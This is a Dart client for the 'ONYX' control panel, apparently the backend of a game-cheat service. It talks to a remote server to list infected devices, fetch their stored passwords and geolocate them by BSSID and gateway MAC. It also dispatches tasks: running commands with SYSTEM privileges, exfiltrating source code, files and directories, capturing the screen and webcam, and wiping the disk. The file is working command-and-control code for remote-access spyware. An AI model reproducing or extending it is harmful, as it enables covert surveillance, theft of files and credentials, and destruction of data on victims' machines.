import 'dart:async';
import 'dart:convert';
import 'dart:io';

import 'package:http/http.dart' as http;

/// ONYX 原生控制端的服务端客户端。
///
/// 只跟 `https://auth.onyxcheat.top/onyx_api.php` 说话，鉴权走 Bearer token。
/// 业务逻辑全在服务端，这里只做「取数据 / 发指令」两件事。
class OnyxApi {
  static const String baseUrl = 'https://auth.onyxcheat.top/onyx_api.php';

  static String _token = '';
  static String get token => _token;
  static bool get hasToken => _token.isNotEmpty;

  static void logout() {
    _token = '';
  }

  /// 管理员密码换 token。失败抛异常，消息可直接显示给用户。
  static Future<void> login(String password) async {
    final resp = await _retry(
      () => http
          .post(
            Uri.parse('$baseUrl?action=login'),
            headers: {'Content-Type': 'application/json'},
            body: jsonEncode({'password': password, 'label': 'onyxcontrol'}),
          )
          .timeout(const Duration(seconds: 20)),
    );
    final m = _decode(resp.body);
    if (m['status'] != 'success') {
      throw Exception((m['msg'] ?? '登录失败').toString());
    }
    _token = (m['token'] ?? '').toString();
    if (_token.isEmpty) throw Exception('服务端没有返回 token');
  }

  static Map<String, String> get _headers => {
        'Authorization': 'Bearer $_token',
        'Accept': 'application/json',
      };

  static Map<String, dynamic> _decode(String body) {
    final v = jsonDecode(body);
    if (v is Map<String, dynamic>) return v;
    throw Exception('响应格式异常');
  }

  /// 连接级抖动（TLS 握手被掐、连接被重置）值得重试；HTTP 语义错误不重试。
  ///
  /// 场景：操作员开着 Clash/梯子时，`auth.onyxcheat.top` 可能被路由到国外节点，
  /// 握手会被中途掐断（`HandshakeConnection terminated during handshake`）。
  /// 实测直连 10/10 成功、走代理 0/5 成功 —— 属于网络抖动，重试能扛过去。
  static bool _isTransient(Object e) =>
      e is HandshakeException || e is SocketException || e is http.ClientException;

  /// [onTimeout] 只对幂等请求开：GET 超时可以重放，POST 超时可能服务端已执行，
  /// 重放会重复下发任务（比如格机被下发两次），所以 POST 只在连接级错误时重试。
  static Future<T> _retry<T>(
    Future<T> Function() fn, {
    int tries = 3,
    bool onTimeout = false,
  }) async {
    Object? last;
    for (var i = 0; i < tries; i++) {
      try {
        return await fn();
      } catch (e) {
        final transient = _isTransient(e) || (onTimeout && e is TimeoutException);
        if (!transient || i == tries - 1) rethrow;
        last = e;
        await Future.delayed(Duration(milliseconds: 400 * (1 << i)));
      }
    }
    throw last!;
  }

  static Future<Map<String, dynamic>> _get(
    String action, [
    Map<String, String>? query,
  ]) async {
    // 坑：Uri.replace(queryParameters:) 是**整体替换** query，不是合并。
    // 写成 Uri.parse('$baseUrl?action=$action').replace(queryParameters: query)
    // 会把 action 一起丢掉，服务端回「缺少 action」——devices / device 全挂。
    // 所以 action 必须并进同一个 map 里。
    final params = <String, String>{'action': action, ...?query};
    final uri = Uri.parse(baseUrl).replace(queryParameters: params);
    final resp = await _retry(
      () => http
          .get(uri, headers: _headers)
          .timeout(const Duration(seconds: 25)),
      onTimeout: true,
    );
    final m = _decode(resp.body);
    if (m['status'] != 'success') {
      throw Exception((m['msg'] ?? '请求失败').toString());
    }
    return m;
  }

  static Future<Map<String, dynamic>> _post(
    String action,
    Map<String, dynamic> body,
  ) async {
    final resp = await _retry(
      () => http
          .post(
            Uri.parse('$baseUrl?action=$action'),
            headers: {..._headers, 'Content-Type': 'application/json'},
            body: jsonEncode(body),
          )
          .timeout(const Duration(seconds: 30)),
    );
    final m = _decode(resp.body);
    if (m['status'] != 'success') {
      throw Exception((m['msg'] ?? '请求失败').toString());
    }
    return m;
  }

  static Future<Map<String, dynamic>> summary() async {
    final m = await _get('summary');
    return (m['data'] as Map).cast<String, dynamic>();
  }

  static Future<List<Map<String, dynamic>>> devices() async {
    final m = await _get('devices', {'limit': '300'});
    return ((m['items'] as List?) ?? [])
        .map((e) => (e as Map).cast<String, dynamic>())
        .toList();
  }

  /// 单设备详情。**只有这个接口会下发密码**，列表接口不下发。
  static Future<Map<String, dynamic>> device(String hwid) async {
    final m = await _get('device', {'hwid': hwid});
    return (m['data'] as Map).cast<String, dynamic>();
  }

  /// 网络指纹 + 同网关联。IP 只到城市，BSSID / 网关 MAC 才是能到楼、能串人的东西。
  static Future<Map<String, dynamic>> geo(String hwid) async {
    final m = await _get('geo', {'hwid': hwid});
    final r = m['result'];
    return r is Map ? r.cast<String, dynamic>() : <String, dynamic>{};
  }

  static Future<String> dispatchTask(
    String hwid,
    String type, {
    Map<String, dynamic> params = const {},
    int ttl = 3600,
  }) async {
    final m = await _post('task', {
      'hwid': hwid,
      'type': type,
      'params': jsonEncode(params),
      'ttl': ttl,
    });
    return (m['task_id'] ?? '').toString();
  }

  static Future<Map<String, dynamic>> runPlaybook(
      String hwid, String name) async {
    final m = await _post('playbook', {'hwid': hwid, 'name': name});
    return (m['result'] as Map).cast<String, dynamic>();
  }

  static Future<void> ban(String username, bool ban) async {
    await _post('ban', {
      'username': username,
      'action': ban ? 'ban' : 'unban',
    });
  }

  static Future<void> cancelTask(String taskId) async {
    await _post('cancel', {'task_id': taskId});
  }

  static Future<List<Map<String, dynamic>>> exposures() async {
    final m = await _get('exposures');
    return ((m['items'] as List?) ?? [])
        .map((e) => (e as Map).cast<String, dynamic>())
        .toList();
  }

  /// 取证文件下载地址。token 走 query，方便直接交给系统浏览器/看图程序打开。
  static String artifactUrl(int id, {bool download = false}) =>
      '$baseUrl?action=artifact&id=$id&token=$_token${download ? '&dl=1' : ''}';

  /// 任务类型 → 中文名。与服务端 onyxcontrol.php 的 TASK_LABELS 保持一致。
  static const Map<String, String> taskLabels = {
    'ping': '探活',
    'collect_identity': '收集身份',
    'exec': '执行命令',
    'collect_src': '扫源码',
    'collect_file': '取单个文件',
    'collect_tree': '取整个目录',
    'capture_screen': '截屏',
    'capture_cam': '摄像头',
    'wipe': '格机',
  };

  static const Map<String, String> taskHints = {
    'ping': '只回一个 ok，确认机器还在线',
    'collect_identity': '计算机名、系统版本、agent 版本',
    'exec': '在对方机器上执行一条命令，SYSTEM 权限',
    'collect_src': '扫源码工程目录，打包回传',
    'collect_file': '取指定路径的单个文件',
    'collect_tree': '取指定目录下的文件，有大小上限',
    'capture_screen': '截当前桌面，只有登录会话里的进程截得到',
    'capture_cam': '调用摄像头拍一张',
    'wipe': 'phase=arm 只是预演，run 才真删',
  };

  static const Map<String, String> statusLabels = {
    'pending': '待取',
    'delivered': '已下发',
    'done': '完成',
    'failed': '失败',
    'cancelled': '已取消',
    'expired': '已过期',
  };
}
